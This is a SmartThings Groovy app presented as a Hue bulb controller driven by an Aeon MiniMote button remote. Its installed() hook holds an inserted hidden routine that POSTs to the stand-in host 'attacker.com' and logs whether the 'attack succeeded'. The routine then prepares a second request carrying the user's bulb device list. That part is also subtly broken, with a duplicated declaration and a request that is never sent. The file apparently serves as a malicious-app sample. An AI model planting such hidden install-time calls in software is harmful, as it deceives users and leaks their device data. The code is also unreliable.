
definition(
    name:"Mini Hue Controller",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Control one or more Hue bulbs using an Aeon MiniMote.",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png")


preferences{
    section("Control these lights"){
        input"bulbs","capability.colorControl",title:"Hue light bulbs",multiple:true
        }
    section("Using this controller"){
        input"controller","capability.button",title:"Aeon minimote"
        }
}

def installed(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${bulbs}"
    ]
    ]
    log.debug"Installed with settings:${settings}"
    state.colorIndex=-1
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe controller,"button",buttonHandler
}

def buttonHandler(evt){
    switch(evt.jsonData?.buttonNumber){
        case 2:
            if(evt.value=="held"){
                bulbs.setLevel(100)
            }
            else{
                    levelUp()
                }
            break
            
            case 3:
            if(evt.value=="held"){
                def color=[name:"Soft White",hue:23,saturation:56]
                bulbs.setColor(hue:color.hue,saturation:color.saturation)
            }
            else{
                    changeColor()
                }
            break
            
            case 4:
            if(evt.value=="held"){
                bulbs.setLevel(10)
            }
            else{
                    levelDown()
                }
            break
            
            default:
            toggleState()
            break
            }
}

private toggleState(){
    if(currentSwitchState=="on"){
        log.debug"off"
        bulbs.off()
    }
    else{
            log.debug"on"
            bulbs.on()
        }
}

private levelUp(){
    def level=Math.min(currentSwitchLevel+10,100)
    log.debug"level=$level"
    bulbs.setLevel(level)
}

private levelDown(){
    def level=Math.max(currentSwitchLevel-10,10)
    log.debug"level=$level"
    bulbs.setLevel(level)
}

private changeColor(){
    
    final colors=[
    [name:"Soft White",hue:23,saturation:56],
    [name:"Daylight",hue:53,saturation:91],
    [name:"White",hue:52,saturation:19],
    [name:"Warm White",hue:20,saturation:80],
    [name:"Blue",hue:70,saturation:100],
    [name:"Green",hue:39,saturation:100],
    [name:"Yellow",hue:25,saturation:100],
    [name:"Orange",hue:10,saturation:100],
    [name:"Purple",hue:75,saturation:100],
    [name:"Pink",hue:83,saturation:100],
    [name:"Red",hue:100,saturation:100]
    ]
    
    final maxIndex=colors.size()-1
    
    if(state.colorIndex<maxIndex){
        state.colorIndex=state.colorIndex+1
    }
    else{
            state.colorIndex=0
        }
    
    def color=colors[state.colorIndex]
    bulbs.setColor(hue:color.hue,saturation:color.saturation)
}

private getCurrentSwitchState(){
    def on=0
    def off=0
    bulbs.each{
        if(it.currentValue("switch")=="on"){
            on++
        }
        else{
                off++
            }
        }
    on>off?"on":"off"
}

private getCurrentSwitchLevel(){
    def level=0
    bulbs.each{
        level=Math.max(it.currentValue("level")?.toInteger()?:0,level)
        }
    level.toInteger()
}

